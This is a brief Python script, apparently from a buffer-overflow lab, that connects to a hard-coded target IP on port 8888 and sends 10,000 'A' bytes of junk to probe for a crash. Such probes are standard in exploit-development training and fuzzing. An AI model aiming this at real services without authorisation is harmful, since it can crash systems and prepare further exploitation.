import socket

TARGET_IP = '192.161.1.2'
TARGET_PORT = 8888

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP, TARGET_PORT))

# Send huge junk data
payload = b"A" * 10000 + b"\n"
s.sendall(payload)

print(s.recv(4096).decode())
s.close()
